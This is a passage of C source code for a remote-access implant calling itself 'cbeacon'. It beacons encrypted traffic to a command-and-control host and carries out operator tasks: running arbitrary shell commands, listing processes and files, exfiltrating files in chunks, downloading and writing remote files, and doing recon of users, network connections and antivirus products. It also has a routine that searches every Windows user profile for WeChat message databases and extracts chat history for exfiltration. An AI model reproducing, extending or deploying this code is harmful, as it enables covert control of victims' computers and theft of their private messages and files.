        char appdata[MAX_PATH] = {0};
        DWORD ad_len = GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
        if (ad_len > 0 && ad_len < MAX_PATH) {
            char c0[MAX_PATH] = {0};
            _snprintf(c0, sizeof(c0), "%s\\Tencent\\WeChat", appdata);
            WECHAT_NOTE_PROBED(c0);
            WECHAT_ADD_ROOT(c0);
        }
        char home[MAX_PATH] = {0};
        DWORD h_len = GetEnvironmentVariableA("USERPROFILE", home, MAX_PATH);
        if (h_len > 0 && h_len < MAX_PATH) {
            char c1[MAX_PATH] = {0};
            _snprintf(c1, sizeof(c1), "%s\\Documents\\WeChat Files", home);
            WECHAT_NOTE_PROBED(c1);
            WECHAT_ADD_ROOT(c1);
        }
        /* Per-profile sweep for service-account agents. */
        char sysdrive[16] = {0};
        DWORD sd_len = GetEnvironmentVariableA("SystemDrive", sysdrive, sizeof(sysdrive));
        if (sd_len == 0 || sd_len >= sizeof(sysdrive)) {
            _snprintf(sysdrive, sizeof(sysdrive), "C:");
        }
        char users[MAX_PATH] = {0};
        _snprintf(users, sizeof(users), "%s\\Users\\*", sysdrive);
        {
            WIN32_FIND_DATAA ufd;
            HANDLE hu = FindFirstFileA(users, &ufd);
            if (hu != INVALID_HANDLE_VALUE) {
                do {
                    if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                    if (strcmp(ufd.cFileName, ".") == 0 || strcmp(ufd.cFileName, "..") == 0) continue;
                    if (_strnicmp(ufd.cFileName, "Default", 7) == 0) continue;
                    if (_stricmp(ufd.cFileName, "Public") == 0) continue;
                    if (_stricmp(ufd.cFileName, "All Users") == 0) continue;
                    char base[MAX_PATH] = {0};
                    _snprintf(base, sizeof(base), "%s\\Users\\%s", sysdrive, ufd.cFileName);
                    char c2[MAX_PATH] = {0}, c3[MAX_PATH] = {0}, c4[MAX_PATH] = {0};
                    _snprintf(c2, sizeof(c2), "%s\\AppData\\Roaming\\Tencent\\WeChat", base);
                    _snprintf(c3, sizeof(c3), "%s\\Documents\\WeChat Files", base);
                    _snprintf(c4, sizeof(c4), "%s\\OneDrive\\Documents\\WeChat Files", base);
                    WECHAT_NOTE_PROBED(c2);
                    WECHAT_NOTE_PROBED(c3);
                    WECHAT_NOTE_PROBED(c4);
                    WECHAT_ADD_ROOT(c2);
                    WECHAT_ADD_ROOT(c3);
                    WECHAT_ADD_ROOT(c4);
                } while (FindNextFileA(hu, &ufd));
                FindClose(hu);
            }
        }
    }

    /* Allocate output buffer */
    char *out = (char *)malloc(65536);
    if (!out) return NULL;
    out[0] = '\0';

    strcat_s(out, 65536, "=== wechat history ===\n");

    if (nroots == 0) {
        /* Same marker the Go agent emits so the UI reports "no data
           directory" instead of the misleading "no matching messages". */
        strcat_s(out, 65536, "(WeChat data directory not found or not on Windows)\n");
        if (probed[0]) {
            char diag[2112] = {0};
            _snprintf(diag, sizeof(diag), "# probed: %s\n", probed);
            strcat_s(out, 65536, diag);
        }
        *outlen = (DWORD)strlen(out);
        return out;
    }

    int total_rows = 0;

    for (int ri = 0; ri < nroots; ri++) {
        char wechat_root[MAX_PATH] = {0};
        _snprintf(wechat_root, sizeof(wechat_root), "%s", roots[ri]);

    /* Open WeChat root directory */
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATAA findData;
    char searchPath[MAX_PATH] = {0};
    _snprintf(searchPath, sizeof(searchPath), "%s\\*", wechat_root);

    hFind = FindFirstFileA(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;

            /* Build Msg directory path: <root>\<wxid>\Msg\ */
            char msgDir[MAX_PATH] = {0};
            _snprintf(msgDir, sizeof(msgDir), "%s\\%s\\Msg", wechat_root, findData.cFileName);

            /* Find all .db files in Msg directory */
            char dbSearch[MAX_PATH] = {0};
            _snprintf(dbSearch, sizeof(dbSearch), "%s\\*.db", msgDir);

            HANDLE hDbFind = FindFirstFileA(dbSearch, &findData);
            if (hDbFind == INVALID_HANDLE_VALUE) continue;

            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                if (!strstr(findData.cFileName, ".db")) continue;

                char dbPath[MAX_PATH] = {0};
                _snprintf(dbPath, sizeof(dbPath), "%s\\%s", msgDir, findData.cFileName);

                /* Copy DB to temp file to avoid locking issues */
                char tempPath[MAX_PATH] = {0};
                char tempName[MAX_PATH] = {0};
                GetTempPathA(MAX_PATH, tempPath);
                _snprintf(tempName, sizeof(tempName), "wechat_hist_%llu.db", GetTickCount64());
                char tempFile[MAX_PATH] = {0};
                _snprintf(tempFile, sizeof(tempFile), "%s%s", tempPath, tempName);

                if (!CopyFileA(dbPath, tempFile, FALSE)) {
                    continue;
                }

                /* Open SQLite database (lazy: encrypted DBs fail on first use,
                   not here — the schema probe below reports those). */
                sqlite3 *db = NULL;
                if (sqlite3_open(tempFile, &db) != SQLITE_OK) {
                    if (db) sqlite3_close(db);
                    DeleteFileA(tempFile);
                    if (wechat_is_msg_db_name(findData.cFileName)) {
                        char ebuf[512] = {0};
                        _snprintf(ebuf, sizeof(ebuf), "=== %s ===\nquery error: %s: database is encrypted or unsupported (WeChat 4.x encrypts message DBs; extract the key from the live WeChat process)\n",
                            findData.cFileName, findData.cFileName);
                        strcat_s(out, 65536, ebuf);
                    }
                    continue;
                }

                /* Schema probe: legacy message table vs modern MSG table.
                   Accessory DBs (Emotion/Media/Favorite/...) have neither and
                   are skipped silently. */
                int wechat_qerr = 0;
                int has_old = wechat_db_has_table(db, "message", &wechat_qerr);
                int has_new = 0;
                if (has_old == 0) has_new = wechat_db_has_table(db, "MSG", &wechat_qerr);
                if (has_old < 0 || has_new < 0) {
                    char ebuf[512] = {0};
                    _snprintf(ebuf, sizeof(ebuf), "=== %s ===\nquery error: %s: database is encrypted or unsupported (WeChat 4.x encrypts message DBs; extract the key from the live WeChat process)\n",
                        findData.cFileName, findData.cFileName);
                    strcat_s(out, 65536, ebuf);
                    sqlite3_close(db);
                    DeleteFileA(tempFile);
                    continue;
                }
                if (!has_old && !has_new) {
                    sqlite3_close(db);
                    DeleteFileA(tempFile);
                    continue;
                }

                if (!has_old) {
                    /* Modern layout: MSG + Name2ID (WeChat >= 3.9 / 4.x). */
                    wechat_name_t nmap[512];
                    int nmap_n = wechat_load_name2id(db, nmap, 512);
                    sqlite3_stmt *mstmt = NULL;
                    int full = 1;
                    if (sqlite3_prepare_v2(db,
                        "SELECT TalkerId, CreateTime, StrTalker, Type, StrContent, IsSender FROM MSG "
                        "WHERE CreateTime >= 0 ORDER BY CreateTime DESC LIMIT 200",
                        -1, &mstmt, NULL) != SQLITE_OK) {
                        full = 0;
                        if (sqlite3_prepare_v2(db,
                            "SELECT TalkerId, CreateTime, Type, IsSender FROM MSG "
                            "WHERE CreateTime >= 0 ORDER BY CreateTime DESC LIMIT 200",
                            -1, &mstmt, NULL) != SQLITE_OK) {
                            mstmt = NULL;
                        }
                    }
                    if (!mstmt) {
                        char ebuf[512] = {0};
                        _snprintf(ebuf, sizeof(ebuf), "=== %s ===\nquery error: %s: MSG table has unexpected schema\n",
                            findData.cFileName, findData.cFileName);
                        strcat_s(out, 65536, ebuf);
                    } else {
                        while (sqlite3_step(mstmt) == SQLITE_ROW) {
                            long long talker = sqlite3_column_int64(mstmt, 0);
                            long long ctime = sqlite3_column_int64(mstmt, 1);
                            const char *stalk = full ? (const char *)sqlite3_column_text(mstmt, 2) : NULL;
                            int mtype = sqlite3_column_int(mstmt, full ? 3 : 2);
                            const char *scontent = full ? (const char *)sqlite3_column_text(mstmt, 4) : NULL;
                            int missender = sqlite3_column_int(mstmt, full ? 5 : 3);
                            if (!stalk) stalk = "";
                            if (!scontent) scontent = "";
                            char room[96] = {0};
                            for (int k = 0; k < nmap_n; k++) {
                                if (nmap[k].id == talker) { _snprintf(room, sizeof(room), "%s", nmap[k].name); break; }
                            }
                            if (!room[0] && stalk[0]) _snprintf(room, sizeof(room), "%s", stalk);
                            if (!room[0]) _snprintf(room, sizeof(room), "%lld", talker);
                            if (hasContact) {
                                char roomlow[96] = {0}, stalklow[256] = {0};
                                wechat_ascii_lower(roomlow, sizeof(roomlow), room);
                                wechat_ascii_lower(stalklow, sizeof(stalklow), stalk);
                                if (!strstr(roomlow, contact) && !strstr(stalklow, contact)) continue;
                            }
                            wechat_emit_json(out, ctime, missender, room, room, mtype, scontent, &total_rows);
                        }
                        sqlite3_finalize(mstmt);
                    }
                    sqlite3_close(db);
                    DeleteFileA(tempFile);
                    continue;
                }

                /* Build query with filters. Contact keywords are bound as
                   parameters so quotes cannot break out of the SQL string. */
                char query[2048] = {0};
                sqlite3_stmt *stmt = NULL;
                char like[512] = {0};

                _snprintf(query, sizeof(query),
                    "SELECT m.MsgId, m.CreateTime, m.TalkerId, m.Type, m.Content, m.IsSender, "
                    "IFNULL(c.NickName,''), IFNULL(c.Alias,''), IFNULL(c.Remark,'') "
                    "FROM message m "
                    "LEFT JOIN contact c ON m.TalkerId = c.UserName "
                    "WHERE m.CreateTime >= 0 AND m.CreateTime <= 2147483647000 "
                    "%s"
                    "ORDER BY m.CreateTime DESC LIMIT 200",
                    hasContact ?
                    "AND (LOWER(IFNULL(c.NickName,'')) LIKE ? ESCAPE '\\' OR "
                    "LOWER(IFNULL(c.Alias,'')) LIKE ? ESCAPE '\\' OR "
                    "LOWER(IFNULL(c.Remark,'')) LIKE ? ESCAPE '\\' OR "
                    "LOWER(m.TalkerId) LIKE ? ESCAPE '\\') " : ""
                );

                if (hasContact) {
                    size_t li = 0;
                    size_t ci = 0;
                    like[li++] = '%';
                    while (contact[ci] && li + 4 < sizeof(like)) {
                        unsigned char ch = (unsigned char)contact[ci++];
                        if (ch == '%' || ch == '_' || ch == '\\') {
                            like[li++] = '\\';
                        }
                        like[li++] = (char)ch;
                    }
                    if (li + 2 <= sizeof(like)) {
                        like[li++] = '%';
                    }
                    like[li] = '\0';
                }

                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                    int bindOk = 1;
                    if (hasContact) {
                        for (int bi = 1; bi <= 4; bi++) {
                            if (sqlite3_bind_text(stmt, bi, like, -1, SQLITE_TRANSIENT) != SQLITE_OK) {
                                bindOk = 0;
                                break;
                            }
                        }
                    }
                    if (!bindOk) {
                        sqlite3_finalize(stmt);
                        stmt = NULL;
                    }
                }
                if (stmt) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        long long createTime = sqlite3_column_int64(stmt, 1);
                        const char *talkerId = (const char *)sqlite3_column_text(stmt, 2);
                        const char *content = (const char *)sqlite3_column_text(stmt, 4);
                        const char *nickName = (const char *)sqlite3_column_text(stmt, 6);
                        const char *alias = (const char *)sqlite3_column_text(stmt, 7);
                        const char *remark = (const char *)sqlite3_column_text(stmt, 8);

                        if (!talkerId) talkerId = "";
                        if (!content) content = "";
                        if (!nickName) nickName = "";
                        if (!alias) alias = "";
                        if (!remark) remark = "";

                        /* Determine contact display name: Remark > Alias > NickName > TalkerId */
                        const char *contactName = talkerId;
                        if (remark && remark[0]) contactName = remark;
                        else if (alias && alias[0]) contactName = alias;
                        else if (nickName && nickName[0]) contactName = nickName;

                        /* Format time: WeChat uses milliseconds since epoch */
                        time_t sec = (time_t)(createTime / 1000);
                        struct tm *tm = gmtime(&sec);
                        char timeBuf[64] = {0};
                        strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%dT%H:%M:%SZ", tm);

                        const char *senderText = sqlite3_column_int(stmt, 5) == 1 ? "me" : "other";
                        char *timeEsc = jescape(timeBuf, strlen(timeBuf));
                        char *senderEsc = jescape(senderText, strlen(senderText));
                        char *contactEsc = jescape(contactName, strlen(contactName));
                        char *talkerEsc = jescape(talkerId, strlen(talkerId));
                        char *contentEsc = jescape(content, strlen(content));
                        if (!timeEsc || !senderEsc || !contactEsc || !talkerEsc || !contentEsc) {
                            free(timeEsc);
                            free(senderEsc);
                            free(contactEsc);
                            free(talkerEsc);
                            free(contentEsc);
                            continue;
                        }
                        size_t need = strlen(timeEsc) + strlen(senderEsc) + strlen(contactEsc) +
                            strlen(talkerEsc) + strlen(contentEsc) + 128;
                        char *line = (char *)malloc(need);
                        if (!line) {
                            free(timeEsc);
                            free(senderEsc);
                            free(contactEsc);
                            free(talkerEsc);
                            free(contentEsc);
                            continue;
                        }
                        _snprintf(line, need,
                            "{\"time\":\"%s\",\"sender\":\"%s\",\"contact\":\"%s\",\"contact_id\":\"%s\",\"type\":%d,\"content\":\"%s\"}\n",
                            timeEsc, senderEsc, contactEsc, talkerEsc,
                            sqlite3_column_int(stmt, 3), contentEsc);
                        strcat_s(out, 65536, line);
                        free(line);
                        free(timeEsc);
                        free(senderEsc);
                        free(contactEsc);
                        free(talkerEsc);
                        free(contentEsc);
                        total_rows++;
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
                DeleteFileA(tempFile);
            } while (FindNextFileA(hDbFind, &findData));
            FindClose(hDbFind);
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
        } /* if (hFind valid) */
    } /* per-root containers */

    if (total_rows == 0) {
        strcat_s(out, 65536, "(no matching messages found)\n");
    }
    char summary[128];
    _snprintf(summary, sizeof(summary), "# total_rows=%d\n", total_rows);
    strcat_s(out, 65536, summary);

    *outlen = (DWORD)strlen(out);
    return out;
}

int main(void) {
    fprintf(stderr, "[cbeacon] enter\n");
    BYTE shared[32], sesskey[32];
    DWORD seclen = 0;
    BYTE *secret = NULL;
    char *results = _strdup("");
    setvbuf(stdout, NULL, _IONBF, 0);
    if (SECRET_ID[0] == '\0' || SECRET_B64[0] == '\0') {
        fprintf(stderr, "[cbeacon] build with -DSECRET_ID=... -DSECRET_B64=...\n");
        return 1;
    }
    secret = b64dec(SECRET_B64, &seclen);
    if (!secret || seclen != 32) {
        fprintf(stderr, "[cbeacon] bad SECRET_B64\n");
        return 1;
    }
    fprintf(stderr, "[cbeacon] secret ok\n");
    memcpy(g_regkey, secret, 32);
    cng_wipe(secret, seclen);
    free(secret);
    {
        BYTE idpriv[32], idpub[32];
        fprintf(stderr, "[cbeacon] loading identity...\n");
        if (ident_load(idpriv) == 0 && cng_x25519_use_priv(idpriv, idpub) == 0) {
            printf("[cbeacon] identity restored\n");
            g_mode_register = 0;
            seq_load(); /* recover via handshake, not re-register */
        } else {
            fprintf(stderr, "[cbeacon] fresh identity...\n");
            gen_uuid();
            g_seq = 0;
            seq_save();
            if (cng_random(idpriv, 32) != 0) return 1;
            fprintf(stderr, "[cbeacon] random ok, selftest+derive...\n");
            if (cng_x25519_use_priv(idpriv, idpub) != 0) return 1;
            fprintf(stderr, "[cbeacon] key ok, saving...\n");
            if (ident_save(idpriv) != 0)
                fprintf(stderr, "[cbeacon] warning: identity not persisted\n");
        }
        memcpy(g_idpub_for_reg, idpub, 32);
        cng_wipe(idpriv, 32);
    }
    printf("[cbeacon] uuid=%s c2=%s:%d%s\n", g_uuid, C2_HOST, C2_PORT, BEACON_PATH);

    for (;;) {
        char *frame = NULL, *resp = NULL;
        DWORD resplen = 0;
        unsigned long long frameseq = 0;
        if (!g_registered) {
            frame = g_mode_register ? build_register() : build_handshake();
            dbglog(g_mode_register ? "built-reg" : "built-hs", "", 0);
        } else {
            /* results can carry base64 file chunks: build inner on the heap. */
            char *info = build_info_json();
            size_t rlen = results ? strlen(results) : 0;
            size_t icap = rlen + INFO_CAP + 512;
            char *inner = (char *)malloc(icap);
            if (!info || !inner) {
                if (info) free(info);
                if (inner) free(inner);
                Sleep(5000);
                continue;
            }
            _snprintf(inner, icap,
                      "{\"uuid\":\"%s\",\"pv\":2,\"info\":{%s},\"results\":[%s]}",
                      g_uuid, info, results);
            dbglog("results", results, (int)strlen(results));
            dbglog("inner", inner, (int)strlen(inner));
            free(info);
            frame = build_encrypted(inner, &frameseq);
            free(inner);
        }
        if (!frame) { Sleep(5000); continue; }
        resp = http_post(frame, (DWORD)strlen(frame), &resplen);
        free(frame);
        dbglog("post-ret", "", 0);
        if (!resp) { do_sleep_interval(); continue; }
        /* Delivery confirmed (HTTP 200 with body): clear sent results.
         * On encrypt/post failure above we keep `results` for the next
         * loop (Go pendingResults parity) instead of dropping tasks to
         * "running" forever (e.g. TASK 4 lost after a 400). */
        free(results);
        results = _strdup("");
        if (!results) results = _strdup("");
        dbglog(g_registered ? "resp-enc" : "resp-reg", resp, (int)resplen);

        if (!g_registered) {
            /* auth response: {seq,reg_ok,ecdh_pub,mac,reregister?} */
            char spub[512] = {0}, mac[512] = {0};
            unsigned long long seq = ju64(resp, "seq");
            int regok = jbool(resp, "reg_ok");
            int rereg = jbool(resp, "reregister");
            if (strstr(resp, "kill_switch")) {
                fprintf(stderr, "[cbeacon] kill-switch armed, exiting\n");
                free(resp);
                return 0;
            }
            if (rereg) {
                /* Server lost our row but holds our secret: re-enroll. */
                g_mode_register = 1;
                free(resp);
                Sleep(2000);
                continue;
            }
            if (!jstring(resp, "ecdh_pub", spub, sizeof(spub)) ||
                !jstring(resp, "mac", mac, sizeof(mac)) ||
                !verify_resp_mac(seq, spub, mac)) {
                fprintf(stderr, "[cbeacon] auth response rejected\n");
                /* Flip auth mode: register-reject on a persisted identity
                 * means "already registered" -> handshake; handshake-reject
                 * means "unknown row" -> try a fresh register. */
                g_mode_register = g_mode_register ? 0 : 1;
                free(resp);
                Sleep(5000);
                continue;
            }
            {
                DWORD publen = 0;
                BYTE *sp = b64dec(spub, &publen);
                int agree_ok;
                if (!sp || publen != 32) {
                    fprintf(stderr, "[cbeacon] ECDH failed\n");
                    if (sp) free(sp);
                    free(resp);
                    return 1;
                }
                /* Registration sessions derive from the identity key, plain
                 * handshakes from the ephemeral one used in the frame. */
                if (regok)
                    agree_ok = cng_x25519_agree(sp, shared);
                else
                    agree_ok = cng_x25519_agree_eph(sp, shared);
                free(sp);
                if (agree_ok != 0) {
                    fprintf(stderr, "[cbeacon] ECDH failed\n");
                    free(resp);
                    return 1;
                }
            }
            if (cng_hkdf_sha256(shared, 32, (const BYTE *)"forgec2-session-v2", 18,
                                (const BYTE *)g_uuid, (DWORD)strlen(g_uuid), sesskey) != 0) {
                fprintf(stderr, "[cbeacon] session derive failed\n");
                free(resp);
                return 1;
            }
            cng_wipe(shared, 32);
            memcpy(g_sesskey, sesskey, 32);
            cng_wipe(sesskey, 32);
            g_have_session = 1;
            g_registered = 1;
            if (regok) {
                printf("[cbeacon] registered, session established\n");
            } else {
                printf("[cbeacon] handshake ok, session established\n");
            }
            free(resp);
            continue;
        }

        /* encrypted response: {"c": ...} or resync plain envelope.
         * NOTE: c64 is heap-allocated: a 2MB stack array overflows the
         * default 1MB main-thread stack at function entry (0xC00000FD). */
        {
            char *c64 = (char *)malloc(RESP_CAP);
            if (!c64) { free(resp); do_sleep_interval(); continue; }
            if (jstring(resp, "c", c64, RESP_CAP)) {
                BYTE *blob;
                DWORD bloblen = 0;
                char aad[128];
                char seqs[32];
                BYTE *pt;
                DWORD ptcap = RESP_CAP;
                int ptlen;
                _snprintf(seqs, sizeof(seqs), "%llu", frameseq);
                _snprintf(aad, sizeof(aad), "%s%c%s", g_uuid, '\0', seqs);
                blob = b64dec(c64, &bloblen);
                pt = (BYTE *)malloc(ptcap);
                if (blob && pt) {
                    ptlen = cng_aesgcm_decrypt(g_sesskey, blob, bloblen,
                                              (const BYTE *)aad,
                                              (DWORD)(strlen(g_uuid) + 1 + strlen(seqs)),
                                              pt, ptcap);
                    if (ptlen > 0) {
                        pt[ptlen] = '\0';
                        /* dispatch tasks; results queued for next beacon */
                        {
                            const char *tp = strstr((char *)pt, "\"tasks\"");
                            if (tp) {
                                const char *arr = strchr(tp, '[');
                                if (arr) {
                                    const char *p = arr + 1;
                                    char *newres = _strdup("");
                                    int kill_now = 0;
                                    while (*p && *p != ']') {
                                        p = jskip(p);
                                        if (*p == ',') { p++; continue; }
                                        if (*p != '{') break;
                                        {
                                            ctask_t t;
                                            const char *next = parse_task(p, &t);
                                            char *rid = make_rid();
                                            char *robj = NULL;
                                            if (!rid) rid = _strdup("");
                                            if (t.type[0] && decrypt_task(&t) != 0) {
                                                robj = emit_error_result(t.id, t.type[0] ? t.type : "shell",
                                                    "task payload decryption failed", rid);
                                            } else if (t.type[0] == '\0') {
                                                robj = NULL;
                                            } else if (strcmp(t.type, "shell") == 0) {
                                                DWORD olen = 0;
                                                char *out = exec_shell_full(t.command ? t.command : "", t.shell, &olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "shell", b64, rid) : NULL;
                                                    free(b64);
                                                    cng_wipe(out, olen);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "shell", "exec failed", rid);
                                            } else if (strcmp(t.type, "ps") == 0 || strcmp(t.type, "process_tree") == 0) {
                                                DWORD olen = 0;
                                                char *out = do_ps(&olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, t.type, b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, t.type, "ps failed", rid);
                                            } else if (strcmp(t.type, "ls") == 0) {
                                                DWORD olen = 0;
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                char *out = do_ls(pp, &olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "ls", b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "ls", "ls failed", rid);
                                            } else if (strcmp(t.type, "read") == 0) {
                                                DWORD rlen = 0;
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                BYTE *data = do_read_file(pp, &rlen);
                                                if (data) {
                                                    char *b64 = b64enc(data, rlen);
                                                    robj = b64 ? emit_b64_result(t.id, "read", b64, rid) : NULL;
                                                    free(b64);
                                                    cng_wipe(data, rlen);
                                                    free(data);
                                                } else {
                                                    robj = emit_error_result(t.id, "read", "cannot open file", rid);
                                                }
                                            } else if (strcmp(t.type, "hostinfo") == 0) {
                                                char *out = do_hostinfo(t.command);
                                                robj = out ? emit_text_result(t.id, "hostinfo", out, rid) : NULL;
                                                if (out) free(out);
                                                if (!robj) robj = emit_error_result(t.id, "hostinfo", "collect failed", rid);
                                            } else if (strcmp(t.type, "wechat_history") == 0) {
                                                const char *filter = t.command ? t.command : "{}";
                                                DWORD olen = 0;
                                                char *out = do_wechat_history(filter, &olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "wechat_history", b64, rid) : NULL;
                                                    free(b64);
                                                    cng_wipe(out, olen);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "wechat_history", "collect failed", rid);
                                            } else if (strcmp(t.type, "set_sleep") == 0) {
                                                const char *c = t.command ? t.command : "";
                                                int iv = atoi(c);
                                                const char *comma = strchr(c, ',');
                                                int jt = comma ? atoi(comma + 1) : g_jitter;
                                                if (iv >= 1 && iv <= 86400) g_interval = iv;
                                                else robj = emit_error_result(t.id, "set_sleep", "sleep interval must be 1..86400", rid);
                                                if (!robj) {
                                                    if (jt >= 0 && jt <= 100) g_jitter = jt;
                                                    { char msg[128]; _snprintf(msg, sizeof(msg), "sleep set to %d s, jitter %d%%", g_interval, g_jitter); robj = emit_text_result(t.id, "set_sleep", msg, rid); }
                                                }
                                            } else if (strcmp(t.type, "beacon_now") == 0) {
                                                robj = emit_text_result(t.id, "beacon_now", "beacon forced", rid);
                                            } else if (strcmp(t.type, "kill") == 0) {
                                                robj = emit_text_result(t.id, "kill", "Agent terminating...", rid);
                                                kill_now = 1;
                                            } else if (strcmp(t.type, "download") == 0) {
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                if (pp && (_strnicmp(pp, "http://", 7) == 0 || _strnicmp(pp, "https://", 8) == 0)) {
                                                    robj = emit_error_result(t.id, "download", "use download_url for URLs", rid);
                                                } else if (!pp || !pp[0]) {
                                                    robj = emit_error_result(t.id, "download", "path required", rid);
                                                } else {
                                                    DWORD rlen = 0;
                                                    long long roff = 0;
                                                    BYTE *data = do_read_chunk(pp, t.offset, t.size, &rlen, &roff);
                                                    if (data) {
                                                        char *b64 = b64enc(data, rlen);
                                                        if (b64) {
                                                            char mh[65] = {0};
                                                            if (chain_download_link(t.id, data, rlen, mh) != 0) mh[0] = '\0';
                                                            robj = emit_file_result(t.id, "download", b64, rid,
                                                                base_name(pp), pp, roff, (long long)rlen, mh);
                                                            free(b64);
                                                        }
                                                        cng_wipe(data, rlen);
                                                        free(data);
                                                    } else {
                                                        robj = emit_error_result(t.id, "download", "cannot open file", rid);
                                                    }
                                                    if (!robj) robj = emit_error_result(t.id, "download", "chunk failed", rid);
                                                }
                                            } else if (strcmp(t.type, "download_url") == 0) {
                                                const char *url = t.command;
                                                const char *dst = (t.path && t.path[0]) ? t.path : t.shell;
                                                if (!url || !url[0]) {
                                                    robj = emit_error_result(t.id, "download_url", "URL required", rid);
                                                } else {
                                                    char destbuf[MAX_PATH];
                                                    char errmsg[256] = {0};
                                                    if (!dst || !dst[0]) {
                                                        const char *sl = strrchr(url, '/');
                                                        sl = sl ? sl + 1 : url;
                                                        if (!sl[0]) sl = "downloaded.bin";
                                                        _snprintf(destbuf, sizeof(destbuf), "%s", sl);
                                                        dst = destbuf;
                                                    }
                                                    if (download_url_to_file(url, dst, errmsg, sizeof(errmsg)) == 0) {
                                                        char msg[512];
                                                        _snprintf(msg, sizeof(msg), "Downloaded to %s", dst);
                                                        robj = emit_text_result(t.id, "download_url", msg, rid);
                                                    } else {
                                                        robj = emit_error_result(t.id, "download_url", errmsg[0] ? errmsg : "download failed", rid);
                                                    }
                                                }
                                            } else if (strcmp(t.type, "upload") == 0) {
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                const char *b64 = (t.data && t.data[0]) ? t.data : t.shell;
                                                if (!pp || !pp[0] || !b64 || !b64[0]) {
                                                    robj = emit_error_result(t.id, "upload", "upload: path and data required", rid);
                                                } else if (!path_is_safe(pp)) {
                                                    robj = emit_error_result(t.id, "upload", "path traversal rejected", rid);
                                                } else {
                                                    DWORD blen = 0;
                                                    BYTE *raw = b64dec(b64, &blen);
                                                    if (!raw) {
                                                        robj = emit_error_result(t.id, "upload", "upload: bad base64", rid);
                                                    } else if (chain_verify_upload(t.id, raw, blen, t.prev_mac, t.mac) != 0) {
                                                        robj = emit_error_result(t.id, "upload", "chunk HMAC mismatch (tampered/reordered data)", rid);
                                                        cng_wipe(raw, blen);
                                                        free(raw);
                                                    } else {
                                                        HANDLE h;
                                                        LARGE_INTEGER li;
                                                        if (t.offset <= 0)
                                                            h = CreateFileA(pp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                                        else
                                                            h = CreateFileA(pp, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                                        if (h == INVALID_HANDLE_VALUE) {
                                                            robj = emit_error_result(t.id, "upload", "cannot write file", rid);
                                                        } else {
                                                            DWORD wr = 0;
                                                            int ok = 1;
                                                            if (t.offset > 0) {
                                                                li.QuadPart = t.offset;
                                                                if (!SetFilePointerEx(h, li, NULL, FILE_BEGIN)) ok = 0;
                                                            }
                                                            if (ok && (!WriteFile(h, raw, blen, &wr, NULL) || wr != blen)) ok = 0;
                                                            CloseHandle(h);
                                                            robj = ok ? emit_text_result(t.id, "upload", "File chunk uploaded successfully", rid)
                                                                        : emit_error_result(t.id, "upload", "write failed", rid);
                                                        }
                                                        cng_wipe(raw, blen);
                                                        free(raw);
                                                    }
                                                }
                                                                                        } else if (strcmp(t.type, "netstat") == 0 || strcmp(t.type, "users") == 0 || strcmp(t.type, "av") == 0) {
                                                DWORD olen = 0;
                                                char *out = NULL;
                                                if (strcmp(t.type, "netstat") == 0) {
                                                    out = exec_shell_full("netstat -ano", NULL, &olen);
                                                } else if (strcmp(t.type, "users") == 0) {
                                                    out = exec_shell_full("net user", NULL, &olen);
                                                    if (!out || !out[0]) { if (out) free(out); out = exec_shell_full("whoami /all", NULL, &olen); }
                                                } else {
                                                    out = exec_shell_full("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState | Format-List | Out-String", "powershell", &olen);
                                                    if (!out || !out[0]) { if (out) free(out); out = exec_shell_full("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", NULL, &olen); }
                                                }
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, t.type, b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, t.type, "recon failed", rid);
                                            } else if (strcmp(t.type, "mkdir") == 0) {
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                if (!pp || !pp[0]) {
                                                    robj = emit_error_result(t.id, "mkdir", "mkdir: directory path required", rid);
                                                } else if (do_mkdir_all(pp) == 0) {
                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "created directory %s", pp);
                                                    robj = emit_text_result(t.id, "mkdir", msg, rid);
                                                } else {
                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "mkdir %s failed (%lu)", pp, GetLastError());
                                                    robj = emit_error_result(t.id, "mkdir", msg, rid);
                                                }
